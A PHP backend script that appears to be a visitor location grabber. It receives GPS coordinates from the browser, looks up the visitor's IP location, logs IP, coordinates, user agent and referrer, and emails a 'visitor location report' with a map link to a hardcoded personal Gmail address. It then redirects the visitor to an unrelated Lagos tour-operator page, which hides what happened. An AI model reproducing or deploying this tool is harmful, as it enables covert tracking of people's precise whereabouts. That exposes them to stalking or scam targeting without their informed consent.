<?php

declare(strict_types=1);

session_start();

header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

$EMAIL = 'drmagicakins@gmail.com';

/*
 * Change this to false if you don't want automatic redirection.
 */
$REDIRECT_ENABLED = true;

$REDIRECT_URL =
    'https://www.tourtravelworld.com/travel-agents/nigeria/lagos-state-tour-operator.html';


/*
 * ---------------------------------------------------------
 * Utility functions
 * ---------------------------------------------------------
 */

function response(
    bool $success,
    string $message = '',
    ?string $redirect = null
): never {

    echo json_encode([
        'success'  => $success,
        'message'  => $message,
        'redirect' => $redirect
    ]);

    exit;
}


function getClientIP(): string
{
    /*
     * REMOTE_ADDR is the reliable default when you are not
     * behind a trusted reverse proxy.
     */

    $ip = $_SERVER['REMOTE_ADDR'] ?? '';

    if (
        filter_var(
            $ip,
            FILTER_VALIDATE_IP
        )
    ) {
        return $ip;
    }

    return 'Unknown';
}


function httpGetJson(
    string $url,
    int $timeout = 8
): ?array {

    $ch = curl_init($url);

    if ($ch === false) {
        return null;
    }

    curl_setopt_array($ch, [

        CURLOPT_RETURNTRANSFER => true,

        CURLOPT_FOLLOWLOCATION => true,

        CURLOPT_CONNECTTIMEOUT => 5,

        CURLOPT_TIMEOUT => $timeout,

        CURLOPT_SSL_VERIFYPEER => true,

        CURLOPT_SSL_VERIFYHOST => 2,

        CURLOPT_USERAGENT =>
            'AuthorizedVisitorLocation/1.0'

    ]);

    $result = curl_exec($ch);

    $httpCode =
        (int) curl_getinfo(
            $ch,
            CURLINFO_HTTP_CODE
        );

    curl_close($ch);

    if (
        $result === false ||
        $httpCode < 200 ||
        $httpCode >= 300
    ) {
        return null;
    }

    $decoded = json_decode(
        $result,
        true
    );

    return is_array($decoded)
        ? $decoded
        : null;
}


/*
 * ---------------------------------------------------------
 * Request validation
 * ---------------------------------------------------------
 */

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {

    response(
        false,
        'Invalid request method.'
    );
}


$contentType =
    $_SERVER['CONTENT_TYPE'] ?? '';

if (
    stripos(
        $contentType,
        'application/json'
    ) === false
) {

    response(
        false,
        'Invalid request format.'
    );
}


$rawInput =
    file_get_contents('php://input');

$data =
    json_decode(
        $rawInput,
        true
    );

if (!is_array($data)) {

    response(
        false,
        'Invalid request data.'
    );
}


/*
 * CSRF protection.
 */

$sessionToken =
    $_SESSION['csrf_token'] ?? '';

$requestToken =
    $data['csrf_token'] ?? '';

if (
    !is_string($sessionToken) ||
    !is_string($requestToken) ||
    !hash_equals(
        $sessionToken,
        $requestToken
    )
) {

    response(
        false,
        'Security validation failed.'
    );
}


/*
 * ---------------------------------------------------------
 * Validate GPS coordinates
 * ---------------------------------------------------------
 */

$latitude =
    filter_var(
        $data['latitude'] ?? null,
        FILTER_VALIDATE_FLOAT
    );

$longitude =
    filter_var(
        $data['longitude'] ?? null,
        FILTER_VALIDATE_FLOAT
    );

$accuracy =
    filter_var(
        $data['accuracy'] ?? null,
        FILTER_VALIDATE_FLOAT
    );


if (
    $latitude === false ||
    $longitude === false
) {

    response(
        false,
        'Invalid location coordinates.'
    );
}


if (
    $latitude < -90 ||
    $latitude > 90 ||
    $longitude < -180 ||
    $longitude > 180
) {

    response(
        false,
        'Location coordinates are outside valid ranges.'
    );
}


/*
 * ---------------------------------------------------------
 * Visitor information
 * ---------------------------------------------------------
 */

$ip = getClientIP();

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct visit';

$requestUri = $_SERVER['REQUEST_URI'] ?? '/';

$timestamp =
    date(
        'Y-m-d H:i:s'
    );


/*
 * ---------------------------------------------------------
 * IP Geolocation
 * ---------------------------------------------------------
 *
 * This is supplementary information.
 * It should NOT be treated as the visitor's actual address.
 */

$ipDetails = [];

if (
    filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE |
        FILTER_FLAG_NO_RES_RANGE
    )
) {

    $ipURL =
        'https://ipapi.co/' .
        rawurlencode($ip) .
        '/json/';

    $ipDetails =
        httpGetJson($ipURL);
}


$ipCountry =
    $ipDetails['country_name']
    ?? 'Unknown';

$ipRegion =
    $ipDetails['region']
    ?? 'Unknown';

$ipCity =
    $ipDetails['city']
    ?? 'Unknown';

$ipOrg =
    $ipDetails['org']
    ?? 'Unknown';

$ipTimezone =
    $ipDetails['timezone']
    ?? 'Unknown';


/*
 * ---------------------------------------------------------
 * Reverse geocoding
 * ---------------------------------------------------------
 *
 * This example uses BigDataCloud's free client-side
 * reverse-geocoding endpoint directly from the browser
 * instead of violating its client-side usage policy.
 *
 * We therefore obtain the human-readable locality from
 * the browser before submitting to this server.
 *
 * However, for actual street-level address resolution,
 * configure a server-side geocoder such as Google Maps
 * Geocoding or HERE and keep its API key server-side.
 */


/*
 * For now create a reliable Maps URL from the coordinates.
 */

$mapsURL =
    'https://www.google.com/maps?q=' .
    rawurlencode(
        $latitude . ',' . $longitude
    );


/*
 * ---------------------------------------------------------
 * Build log
 * ---------------------------------------------------------
 */

$logFile =
    __DIR__ . '/visitor_log.txt';

$logEntry =
    '[' . $timestamp . '] ' .
    'IP=' . $ip .
    ' | GPS_LAT=' . $latitude .
    ' | GPS_LON=' . $longitude .
    ' | ACCURACY_M=' . ($accuracy ?: 'Unknown') .
    ' | IP_COUNTRY=' . $ipCountry .
    ' | IP_REGION=' . $ipRegion .
    ' | IP_CITY=' . $ipCity .
    ' | USER_AGENT=' . $userAgent .
    ' | REFERRER=' . $referrer .
    ' | URL=' . $requestUri .
    PHP_EOL;

@file_put_contents(
    $logFile,
    $logEntry,
    FILE_APPEND | LOCK_EX
);


/*
 * ---------------------------------------------------------
 * Email
 * ---------------------------------------------------------
 */

$subject =
    'Authorized Visitor Location Report';
$email = "drmagicakins@gmail.com";

$message = <<<EMAIL
AUTHORIZED VISITOR LOCATION REPORT
===================================

Date/Time:
$timestamp

IP INFORMATION
--------------
IP Address:
$ip

IP Country:
$ipCountry

IP Region:
$ipRegion

IP City:
$ipCity

ISP / Organization:
$ipOrg

Timezone:
$ipTimezone


DEVICE GPS INFORMATION
----------------------

Latitude:
$latitude

Longitude:
$longitude

Reported Accuracy:
{$accuracy} metres


MAP
---

$mapsURL


BROWSER
--------

User Agent:
$userAgent

Referrer:
$referrer

Requested URL:
$requestUri


IMPORTANT
---------

The GPS coordinates above were supplied by the
visitor's browser after location permission was
granted.

IP-based city/region information is approximate
and should not be treated as a street address.

EMAIL;


$headers =
    "From: no-reply@mcitng.com\r\n" .
    "Reply-To: no-reply@mcitng.com\r\n" .
    "Content-Type: text/plain; charset=UTF-8\r\n" .
    "X-Mailer: PHP/" . phpversion();


$mailSent =
    mail(
        $email,
        $subject,
        $message,
        $headers
    );


/*
 * ---------------------------------------------------------
 * Response
 * ---------------------------------------------------------
 */

response(
    true,
    'Location processed successfully.',
    $REDIRECT_ENABLED
        ? $REDIRECT_URL
        : null
);